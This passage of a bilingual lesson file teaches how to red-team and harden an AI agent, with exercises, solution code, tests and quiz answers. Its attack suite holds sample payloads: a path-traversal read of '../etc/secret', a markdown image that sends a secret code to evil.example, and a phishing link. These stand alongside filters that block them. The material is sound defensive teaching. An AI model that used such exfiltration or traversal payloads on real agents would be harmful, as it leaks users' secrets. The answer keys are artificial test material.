  solutionCode: |
    import posixpath
    import re
    import urllib.parse

    RACINE = "/data"
    PERMISSIONS = {"lire": "auto", "ecrire": "confirmer"}
    HOTES = ["exemple.org"]

    def chemin_autorise(racine, chemin):
        complet = posixpath.normpath(posixpath.join(racine, chemin))
        base = racine.rstrip("/")
        return complet == base or complet.startswith(base + "/")

    def decision(nom, args, permissions, racine):
        niveau = permissions.get(nom, "refuser")
        if niveau == "refuser":
            return "refuser"
        if "chemin" in args and not chemin_autorise(racine, args["chemin"]):
            return "refuser"
        return niveau

    def retirer_images(texte, hotes_autorises):
        def remplacer(m):
            hote = urllib.parse.urlparse(m.group(2)).hostname
            return m.group(0) if hote in hotes_autorises else "[image retirée]"
        return re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)

    def filtrer_sortie(texte, secrets):
        for s in secrets:
            texte = texte.replace(s, "[SECRET]")
        return texte

    ATTAQUES = [
        {"nom": "chemin piégé", "action": {"outil": "lire", "args": {"chemin": "../etc/secret"}}},
        {"nom": "outil interdit", "action": {"outil": "supprimer", "args": {"chemin": "a.txt"}}},
        {"nom": "fuite par image", "sortie": "Bonjour ![](https://evil.example/x?d=code-1234)"},
        {"nom": "fuite du secret", "sortie": "Le code est code-1234"},
        {"nom": "action légitime", "action": {"outil": "lire", "args": {"chemin": "notes.txt"}}},
        {"nom": "lien piégé", "sortie": "Clique ici : [aide](https://evil.example/hameçon)"},
    ]

    def bloque(attaque):
        if "action" in attaque:
            a = attaque["action"]
            return decision(a["outil"], a["args"], PERMISSIONS, RACINE) == "refuser"
        texte = attaque["sortie"]
        nettoye = filtrer_sortie(retirer_images(texte, HOTES), ["code-1234"])
        return nettoye != texte

    def rapport(attaques):
        bloquees = [a["nom"] for a in attaques if bloque(a)]
        passent = [a["nom"] for a in attaques if not bloque(a)]
        return {"total": len(attaques), "bloquees": len(bloquees), "passent": passent}
  indice:
    fr: 'Deux listes : les noms des attaques bloquées et ceux des non bloquées ; `len` donne les nombres.'
    en: 'Two lists: the names of blocked attacks and those not blocked; `len` gives the numbers.'
  explication:
    fr: La liste des attaques qui passent contient ici la lecture légitime (normal) et le lien piégé (un vrai trou).
    en: The list of attacks that pass here contains the legitimate read (normal) and the trapped link (a real hole).
- id: c8
  type: piege
  fr: 'Ne confonds pas « bloquée » et « sans danger ». Une suite d’attaques ne couvre que celles que **tu** as imaginées. Un attaquant en inventera d’autres : encodages, langues, chaînes d’étapes. Un rapport honnête précise la **portée** du test et ne promet jamais « agent sûr ».'
  en: 'Do not confuse “blocked” with “harmless”. A suite of attacks covers only those that **you** imagined. An attacker will invent others: encodings, languages, chains of steps. An honest report specifies the test’s **scope** and never promises “safe agent”.'
- id: c9
  type: idee
  fr: 'Pour boucher le trou du **lien piégé**, on retire les liens vers un hôte non autorisé, comme pour les images. Chaque faille découverte devient un **test de non-régression** : l’attaque rejoint la suite pour toujours.'
  en: 'To plug the **trapped link** hole, we remove links to an unauthorised host, as for images. Each flaw discovered becomes a **regression test**: the attack joins the suite forever.'
  exemple:
    fr: Une suite d’attaques qui grossit à chaque incident est la mémoire de sécurité de l’équipe.
    en: An attack suite that grows with each incident is the team’s security memory.
- id: c10
  type: code
  defi: true
  note:
    kind: quiz
    poids: 2
  fr: 'Défi final. **Écris `retirer_liens(texte, hotes_autorises)`** : remplace chaque lien Markdown `[texte](url)` (mais pas une image `![…](…)`) dont l’hôte n’est pas dans `hotes_autorises` par `"[lien retiré]"`. Indice : `re.sub(r"(?<!!)\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)`.'
  en: 'Final challenge. **Write `retirer_liens(texte, hotes_autorises)`**: replace each Markdown link `[text](url)` (but not an image `![…](…)`) whose host is not in `hotes_autorises` with `"[lien retiré]"`. Hint: `re.sub(r"(?<!!)\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)`.'
  depart: |
    import re
    import urllib.parse

    # écris ta fonction retirer_liens ici
  tests: |-
    t = "Voir [aide](https://exemple.org/a) ou [piège](https://evil.example/x) ou ![img](https://evil.example/i)"
    r = retirer_liens(t, ["exemple.org"])
    assert r == "Voir [aide](https://exemple.org/a) ou [lien retiré] ou ![img](https://evil.example/i)"
    assert retirer_liens("rien", []) == "rien"
    assert retirer_liens("[a](https://x.org/)", ["x.org"]) == "[a](https://x.org/)"
  solutionCode: |
    import re
    import urllib.parse

    def retirer_liens(texte, hotes_autorises):
        def remplacer(m):
            hote = urllib.parse.urlparse(m.group(2)).hostname
            return m.group(0) if hote in hotes_autorises else "[lien retiré]"
        return re.sub(r"(?<!!)\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)
  indice:
    fr: Même structure que `retirer_images`, avec l’expression `(?<!!)` qui exclut les images (précédées de `!`).
    en: Same structure as `retirer_images`, with the expression `(?<!!)` that excludes images (preceded by `!`).
  explication:
    fr: 'Tu as comblé le trou du rapport : à ajouter à `bloque`, la suite passe à 5 attaques bloquées sur 5 réelles.'
    en: 'You filled the report’s hole: added to `bloque`, the suite goes to 5 attacks blocked out of 5 real ones.'
- id: c11
  type: saisie
  note:
    kind: exercise
    poids: 1
  fr: Si on ajoute `retirer_liens` à `bloque`, l’attaque « lien piégé » devient bloquée. Combien d’attaques de la suite sont alors bloquées (sur 6, l’action légitime restant non bloquée) ?
  en: If we add `retirer_liens` to `bloque`, the “trapped link” attack becomes blocked. How many attacks of the suite are then blocked (out of 6, the legitimate action remaining unblocked)?
